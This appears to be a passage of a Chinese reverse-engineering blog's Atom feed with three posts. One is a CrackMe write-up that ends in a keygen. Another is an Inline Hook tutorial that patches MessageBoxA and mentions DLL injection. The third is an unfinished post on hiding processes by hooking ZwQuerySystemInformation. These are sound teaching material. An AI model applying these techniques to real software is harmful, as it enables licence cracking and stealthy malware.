    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序，看到需要输入用户名和注册码，提示如果正确下面会出现一张朱茵的照片。</p><p><img src="/2021/07/29/160CrackMe-004/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>使用DIE查看一下，无壳，使用Delphi编写的。</p><p><img src="/2021/07/29/160CrackMe-004/2.png"></p><p>使用OD搜索一下字符串，可以看到几个字符串，其中有恭喜注册成功的字样，可以看到还有黑头这样的问题，但是点进去查看没有什么。</p><p><img src="/2021/07/29/160CrackMe-004/3.png"></p><p>下断点在恭喜这里，但是看不到什么有用的信息，在获取用户名的长度，然后加上循环次数这样，但是这并不是注册码，然后跳转的关键在esi+0x30c这里，如果这里的值不等于0x85就会跳转到失败。</p><p><img src="/2021/07/29/160CrackMe-004/4.png"></p><p>此时想到刚才的黑头这样的字样，在程序中出现这样的感觉多少会和注册码有点关系。</p><p>那个地方只有在程序运行的时候才会到达，当跑起来下断是不会断下来的，那里如果出现这样的字眼，并且调用的都是同一个函数，那么有没有可能就是把字符串存在内存里，找到地方下一个断点看看，如果注册码确实用到的话肯定会调用。</p><p>根据字符串找到地方跟一下，发现这里有一个地方向一个地址写入了这些字符串，在这里下一个硬件访问断点看看。</p><p><img src="/2021/07/29/160CrackMe-004/5.png"></p><p>下断点之后，刚输入注册码就断下来在一个地方，跑几步，看到寄存器有一个值，这很像注册码。</p><p><img src="/2021/07/29/160CrackMe-004/6.png"></p><p>大致分析看一下，可以看到在这里有一个向esi+0x30c写入3c的地方，这里有一个JNZ决定是否执行，那么这里应该是一个很关键的地方</p><p><img src="/2021/07/29/160CrackMe-004/7.png"></p><p>看这里，在前面进行了一个比较，然后决定是否跳转。12345是我们输入的注册码</p><p>而黑头Sun Bird12dseloffc-012-OKb1ackie这个是生成的，可以看到b1ackie是用户名目前只有中间这个12不知道是如何生成的，继续分析一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00457D2C  |.  8B45 E0       mov eax,dword ptr ss:[ebp-0x20]                  ;  输入的注册码</span><br><span class="line">00457D2F  |.  8B93 18030000 mov edx,dword ptr ds:[ebx+0x318]                 ;  生成的</span><br><span class="line">00457D35  |.  E8 52BFFAFF   call CKme.00403C8C</span><br><span class="line">00457D3A  |.  75 0A         jnz short CKme.00457D46</span><br><span class="line">00457D3C  |.  C783 0C030000&gt;mov dword ptr ds:[ebx+0x30C],0x3E</span><br></pre></td></tr></table></figure><p><img src="/2021/07/29/160CrackMe-004/8.png"></p><p>这个数字是在前面生成的，是根据输入用户名的长度加上0x5生成的。ebx+0x2F8中是长度，可以通过同样的下断点方法去分析这里的值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00457C66  |.  8BB3 F8020000 mov esi,dword ptr ds:[ebx+0x2F8]                 ;  用户名长度</span><br><span class="line">00457C6C  |.  83C6 05       add esi,0x5                                      ;  加上0x5</span><br><span class="line">00457C6F  |.  FFB3 10030000 push dword ptr ds:[ebx+0x310]</span><br><span class="line">00457C75  |.  8D55 F8       lea edx,dword ptr ss:[ebp-0x8]</span><br><span class="line">00457C78  |.  8BC6          mov eax,esi</span><br><span class="line">00457C7A  |.  E8 85FEFAFF   call CKme.00407B04                               ;  转字符串（10进制）</span><br></pre></td></tr></table></figure><p>这里只要相等就会给关键地址赋值0x3E，但是并不是0x85，继续在这里下断点看一下什么情况。（此时输入黑头Sun Bird12dseloffc-012-OKb1ackie就可以注册成功，不过点击一次是不行的，要连续点击好几次才行）</p><p>但是每次点击都会断在恭喜的那个JNZ那里，可以发现值并没有被改变，还是3E，是我断点的问题，不要下访问断点，改成写入断点，看看在哪里可以写入85。</p><p><img src="/2021/07/29/160CrackMe-004/9.png"></p><p>然后疯狂点击图片，就会断下来，可以看到这里先判断是否等于0x3E然后再赋值0x85。</p><p><img src="/2021/07/29/160CrackMe-004/10.png"></p><p>什么情况才会到这里，其实就是双击会到这里，而普通的点击就是刚开始0x85比较那里，还是借助Dedark工具可以看的更仔细，可以看到事件，用这个工具可以很方便的定位到刚才的几个地方而不需要借助硬件断点，很方便。</p><p><img src="/2021/07/29/160CrackMe-004/12.png"></p><p>那么现在整个流程就清楚了，需要输入正确的注册码之后，先双击再点击就可以成功注册。</p><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>注册码很简单，获取用户名的长度，然后加上5，放在黑头Sun Bird和dseloffc-012-OK中间，最后再加上用户名即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;输入name：\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">gets_s(name, <span class="number">20</span>);</span><br><span class="line"><span class="keyword">int</span> len = <span class="built_in">strlen</span>(name);</span><br><span class="line">len += <span class="number">5</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;注册码：\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;黑头Sun Bird%ddseloffc-012-OK%s&quot;</span>, len, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/07/29/160CrackMe-004/13.png"></p><p><img src="/2021/07/29/160CrackMe-004/11.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序，看到需要输入用户名和注册码，提示如果正确下面会出现一张朱茵的照片。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/29/16</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ack1e.github.io/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>HOOK-Inline Hook</title>
    <link href="https://b1ack1e.github.io/2021/07/28/HOOK-Inline%20Hook/"/>
    <id>https://b1ack1e.github.io/2021/07/28/HOOK-Inline%20Hook/</id>
    <published>2021-07-28T03:17:15.000Z</published>
    <updated>2021-07-29T08:32:24.574Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h4><p>Inline Hook是Hook技术的一种，它是通过修改机器码来实现HOOK。当我们正常调用一个API函数时，正常的流程是，call API，然后就会到函数内部执行。我们写下如下语句，在OD中打开就是如图的样子。可以看到先压入参数，然后调用MessageBoxA函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;这是本来的窗口&quot;</span>, <span class="string">&quot;未被HOOK&quot;</span>, MB_OK);</span><br></pre></td></tr></table></figure><p><img src="/2021/07/28/HOOK-Inline%20Hook/1.png"></p><p>进入函数可以看到函数的具体</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/2.png"></p><p>Inline Hook就是了通过字节码更改了函数的流程，刚才我们看到的是正常的流程，如果调用正常函数的时候，我们修改它的执行流程，使其跳转到我们自定义的函数内部去执行就可以实现Inlie HOOK。</p><h4 id="如何实现"><a href="#如何实现" class="headerlink" title="如何实现"></a>如何实现</h4><p>通过上面我们知道了，我们需要修改的就是程序的执行流程，而改变程序的执行流程就是jmp、call等，我们用最常见的jmp来进行分析。</p><p>如图可以看到一条JMP指令，看到后面的地址是0x401254，再看旁边的机器码是E9 EF000000。我们知道E9是JMP的机器码，那么EF000000为什么和要跳转的地址不一样呢。这是因为在JMP后面使用的是一个偏移量而不是一个具体的地址。如果使用地址的话，数据重定位之后，每次都会变，但是使用偏移就不一样了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401160   . /E9 EF000000        jmp InlineHo.00401254</span><br></pre></td></tr></table></figure><p><img src="/2021/07/28/HOOK-Inline%20Hook/3.png"></p><p>JMP后的偏移计算公式是：</p><p>偏移=目的地址-原地址-5</p><p>5是JMP指令的长度，如果是其他的一些指令的话，那么这里不是5，可能是6、7所以要注意要根据具体情况而来。</p><p>想要用JMP进行修改，我们就需要构造机器码修改前五个字节。来尝试HOOK一下MessageBox函数。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">My_MessageBoxA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ UINT uType)</span></span>;</span><br><span class="line">FARPROC MessageBoxAAddress;</span><br><span class="line">BYTE NewData[<span class="number">5</span>] = &#123; <span class="number">0xE9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">BYTE OldData[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InlineHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnInlineHook</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;原始窗口1&quot;</span>, <span class="string">&quot;未被HOOK&quot;</span>, MB_OK);</span><br><span class="line">    <span class="built_in">InlineHook</span>();</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;原始窗口2&quot;</span>, <span class="string">&quot;未被HOOK&quot;</span>, MB_OK);</span><br><span class="line">    <span class="built_in">UnInlineHook</span>();</span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;原始窗口3&quot;</span>, <span class="string">&quot;未被HOOK&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InlineHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MessageBoxAAddress = <span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    <span class="comment">//保存原数据</span></span><br><span class="line">    <span class="built_in">memcpy</span>(OldData, MessageBoxAAddress, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">//计算需要跳转的偏移</span></span><br><span class="line">    DWORD dwOffset = (DWORD)My_MessageBoxA - (DWORD)MessageBoxAAddress  - <span class="number">5</span>;</span><br><span class="line">    <span class="comment">//写入新数据，跳转的偏移</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;NewData[<span class="number">1</span>], &amp;dwOffset, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    DWORD dwOldprotect = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//修改页属性</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldprotect);</span><br><span class="line">    <span class="comment">//写入五个字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(MessageBoxAAddress, NewData, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">//恢复页属性</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="number">5</span>, dwOldprotect, &amp;dwOldprotect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnInlineHook</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MessageBoxAAddress = <span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibraryA</span>(<span class="string">&quot;user32.dll&quot;</span>), <span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">    DWORD dwOldProtect = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="comment">//恢复原来的字节码</span></span><br><span class="line">    <span class="built_in">memcpy</span>(MessageBoxAAddress, OldData, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>(MessageBoxAAddress, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">My_MessageBoxA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ UINT uType)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//先恢复原来的字节码，然后调用正常的MessageboxA弹窗</span></span><br><span class="line">    <span class="built_in">UnInlineHook</span>();</span><br><span class="line">    <span class="keyword">int</span> bRet = <span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Inline Hook\ni am b1ackie!!!&quot;</span>, <span class="string">&quot;hook&quot;</span>, MB_OK);</span><br><span class="line">    <span class="built_in">InlineHook</span>();</span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有三个弹窗，正常流程下肯定是1,2,3但是我们Inline Hook了MessageBoxA函数，并且将其中内容改了，如果成功的话，第二个弹窗会不一样，运行程序查看效果。</p><p>先是第一个正常的窗口</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/4.png"></p><p>然后是第二个窗口，开始了InlineHook，可以看到并没有弹出原始窗口2，说明此时已经被HOOK了</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/5.png"></p><p>第三个窗口再取消InlineHook后弹出正常的窗口</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/6.png"></p><p>现在使用OD载入程序来看一下，直接查看第二个MessageBoxA函数，进入查看可以看到函数头部已经改变了，变成了JMP。</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/7.png"></p><p>跳过来看，就是我们自己编写的My_MessageBoxA函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">00401170 &gt;/.  55            push ebp</span><br><span class="line">00401171  |.  8BEC          mov ebp,esp</span><br><span class="line">00401173  |.  83EC 08       sub esp,0x8</span><br><span class="line">00401176  |.  A1 04304100   mov eax,dword ptr ds:[__security_cookie_fai&gt;</span><br><span class="line">0040117B  |.  33C5          xor eax,ebp</span><br><span class="line">0040117D  |.  8945 FC       mov dword ptr ss:[ebp-0x4],eax</span><br><span class="line">00401180  |.  56            push esi</span><br><span class="line">00401181  |.  68 4C1C4100   push InlineHo.00411C4C                      ; /MessageBoxA</span><br><span class="line">00401186  |.  68 581C4100   push InlineHo.00411C58                      ; |/user32.dll</span><br><span class="line">0040118B  |.  FF15 04D04000 call dword ptr ds:[&lt;&amp;KERNEL32.LoadLibraryA&gt;&gt;; |\LoadLibraryA</span><br><span class="line">00401191  |.  50            push eax                                    ; |hModule = 00000001</span><br><span class="line">00401192  |.  FF15 08D04000 call dword ptr ds:[&lt;&amp;KERNEL32.GetProcAddres&gt;; \GetProcAddress</span><br><span class="line">00401198  |.  8B35 00D04000 mov esi,dword ptr ds:[&lt;&amp;KERNEL32.VirtualPro&gt;;  kernel32.VirtualProtect</span><br><span class="line">0040119E  |.  8D4D F8       lea ecx,dword ptr ss:[ebp-0x8]</span><br><span class="line">004011A1  |.  51            push ecx                                    ; /pOldProtect = 049BE914</span><br><span class="line">004011A2  |.  6A 40         push 0x40                                   ; |NewProtect = PAGE_EXECUTE_READWRITE</span><br><span class="line">004011A4  |.  6A 05         push 0x5                                    ; |Size = 0x5</span><br><span class="line">004011A6  |.  50            push eax                                    ; |Address = 00000001</span><br><span class="line">004011A7  |.  A3 A0424100   mov dword ptr ds:[MessageBoxAAddressfailure&gt;; |</span><br><span class="line">004011AC  |.  C745 F8 00000&gt;mov dword ptr ss:[ebp-0x8],0x0              ; |</span><br><span class="line">004011B3  |.  FFD6          call esi                                    ; \VirtualProtect</span><br><span class="line">004011B5  |.  8B0D A0424100 mov ecx,dword ptr ds:[MessageBoxAAddressfai&gt;;  user32.MessageBoxA</span><br><span class="line">004011BB  |.  A1 98424100   mov eax,dword ptr ds:[OldDatan_table]</span><br><span class="line">004011C0  |.  8901          mov dword ptr ds:[ecx],eax</span><br><span class="line">004011C2  |.  A0 9C424100   mov al,byte ptr ds:[0x41429C]</span><br><span class="line">004011C7  |.  8841 04       mov byte ptr ds:[ecx+0x4],al</span><br><span class="line">004011CA  |.  8D45 F8       lea eax,dword ptr ss:[ebp-0x8]</span><br><span class="line">004011CD  |.  50            push eax                                    ; /pOldProtect = 00000001</span><br><span class="line">004011CE  |.  FF75 F8       push dword ptr ss:[ebp-0x8]                 ; |NewProtect = PAGE_NOACCESS|PAGE_WRITECOPY|PAGE_EXECUTE|PAGE_EXECUTE_READWRITE|MEM_COMMIT|400400</span><br><span class="line">004011D1  |.  6A 05         push 0x5                                    ; |Size = 0x5</span><br><span class="line">004011D3  |.  51            push ecx                                    ; |Address = 049BE914</span><br><span class="line">004011D4  |.  FFD6          call esi                                    ; \VirtualProtect</span><br><span class="line">004011D6  |.  6A 00         push 0x0                                    ; /Style = MB_OK|MB_APPLMODAL</span><br><span class="line">004011D8  |.  68 641C4100   push InlineHo.00411C64                      ; |hook</span><br><span class="line">004011DD  |.  68 6C1C4100   push InlineHo.00411C6C                      ; |Inline Hook\ni am b1ackie!!!</span><br><span class="line">004011E2  |.  6A 00         push 0x0                                    ; |hOwner = NULL</span><br><span class="line">004011E4  |.  FF15 10D14000 call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;]   ; \MessageBoxA</span><br><span class="line">004011EA  |.  8BF0          mov esi,eax</span><br><span class="line">004011EC  |.  E8 CFFEFFFF   call InlineHo.InlineHook_ansi_nolocketaryso&gt;</span><br><span class="line">004011F1  |.  8B4D FC       mov ecx,dword ptr ss:[ebp-0x4]</span><br><span class="line">004011F4  |.  8BC6          mov eax,esi</span><br><span class="line">004011F6  |.  33CD          xor ecx,ebp</span><br><span class="line">004011F8  |.  5E            pop esi                                     ;  InlineHo.0040103C</span><br><span class="line">004011F9  |.  E8 06000000   call InlineHo.__security_check_cookiepresen&gt;</span><br><span class="line">004011FE  |.  8BE5          mov esp,ebp</span><br><span class="line">00401200  |.  5D            pop ebp                                     ;  InlineHo.0040103C</span><br><span class="line">00401201  \.  C2 1000       retn 0x10</span><br></pre></td></tr></table></figure><h4 id="注入方式实现inline-hook"><a href="#注入方式实现inline-hook" class="headerlink" title="注入方式实现inline hook"></a>注入方式实现inline hook</h4><p>我们可以将inline hook写成一个dll文件，然后通过远线程注入的方式，将其注入到进程中。</p><p>远程线程的具体实现：<a href="https://b1ack1e.github.io/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/">注入技术-远程线程注入</a></p><p>编写一个弹窗，实现效果如下</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/8.png"></p><p>当注入成功后，内容更改</p><p><img src="/2021/07/28/HOOK-Inline%20Hook/9.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>本篇只介绍了32位的Inline Hook，但是64位原理相同，只是修改的字节数不同，还有跳转方式也只介绍了基于JMP的，还有其他几种跳转方式，感兴趣可以看《加密与解密第四版》其中有较为详细的介绍。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Inline-Hook&quot;&gt;&lt;a href=&quot;#Inline-Hook&quot; class=&quot;headerlink&quot; title=&quot;Inline Hook&quot;&gt;&lt;/a&gt;Inline Hook&lt;/h4&gt;&lt;p&gt;Inline Hook是Hook技术的一种，它是通过修改机器码来实现</summary>
      
    
    
    
    <category term="HOOK技术" scheme="https://b1ack1e.github.io/categories/HOOK%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="Inline Hook" scheme="https://b1ack1e.github.io/tags/Inline-Hook/"/>
    
  </entry>
  
  <entry>
    <title>隐藏技术-进程隐藏</title>
    <link href="https://b1ack1e.github.io/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/"/>
    <id>https://b1ack1e.github.io/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/</id>
    <published>2021-07-27T03:25:51.000Z</published>
    <updated>2021-07-30T11:04:59.380Z</updated>
    
    <content type="html"><![CDATA[<h4 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h4><p>在windows中，用户程序的所有操作都是基于WIN32API来实现的，例如使用任务管理器查看进程等操作，这就给了病毒木马操作的空间。它可以通过HOOK技术拦截API的调用，并对数据进行监控和修改，从而达到不可告人的目的。</p><p>实现进程隐藏可以HOOK ZwQuerySystemInformain来实现进程的隐藏。遍历进程通常是调用EnumProcesses或者CreateToolhelp32Snapshot等来实现。跟踪这些函数可以发现，他们内部都调用了ZwQuerySystemInformain函数。</p><p>可以用调试器跟踪一下CreateToolhelp32Snapshot函数，可以看到在内部调用了ZwQuerySystemInformain函数</p><p><img src="/2021/07/27/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F/1.png"></p><p>在ZwQuerySystemInformain函数的内部判断检索的信息是否是进程信息，若是，则对返回的进程信息进行修改，将隐藏的进程信息从中去掉再返回。</p><p>这需要用到Inline Hook，关于Inline Hook看这里</p><p><a href="https://b1ack1e.github.io/2021/07/28/HOOK-Inline%20Hook/">HOOK-Inline Hook</a></p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><p>ZwQuerySystemInformation</p><p>获取指定的系统信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS WINAPI ZwQuerySystemInformation(</span><br><span class="line">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span><br><span class="line">  _Inout_   PVOID                    SystemInformation,</span><br><span class="line">  _In_      ULONG                    SystemInformationLength,</span><br><span class="line">  _Out_opt_ PULONG                   ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>SystemInformationClass：要检索系统的信息类型。SystemProcessInformation(5)表示检索系统的进程信息。</p><p>SystemInformation：指向缓冲区的指针，用于接受请求的信息。该信息的大小和结构取决于SystemInformationClass的值。如检索信息是SystemProcessInformation那么缓冲区为SYSTEM_PROCESS_INFORMATION结构数组。</p><p>SystemInformationLength：SystemInformation指向缓冲区的大小。</p><p>ReturnLength：指向函数写入请求信息的实际大小的位置。</p><p>返回值：返回NTSTATUS成功或错误代码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;进程隐藏&quot;&gt;&lt;a href=&quot;#进程隐藏&quot; class=&quot;headerlink&quot; title=&quot;进程隐藏&quot;&gt;&lt;/a&gt;进程隐藏&lt;/h4&gt;&lt;p&gt;在windows中，用户程序的所有操作都是基于WIN32API来实现的，例如使用任务管理器查看进程等操作，这就给了病毒木马操</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="隐藏技术" scheme="https://b1ack1e.github.io/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>shellcode学习</title>
    <link href="https://b1ack1e.github.io/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/"/>
    <id>https://b1ack1e.github.io/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-07-22T01:58:08.000Z</published>
    <updated>2021-08-03T09:25:05.001Z</updated>
    
